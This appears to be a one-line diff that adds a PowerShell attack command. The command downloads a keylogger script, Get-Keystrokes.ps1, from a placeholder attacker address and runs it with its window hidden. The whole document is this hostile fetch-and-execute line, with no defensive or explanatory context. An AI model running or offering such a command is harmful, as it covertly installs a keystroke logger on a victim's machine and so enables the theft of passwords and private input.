@@ -1,0 +1,1 @@
+wget http://{ip_attacker}/Get-Keystrokes.ps1 -OutFile Get-Keystrokes.ps1; powershell.exe -windowstyle hidden -file Get-Keystrokes.ps1
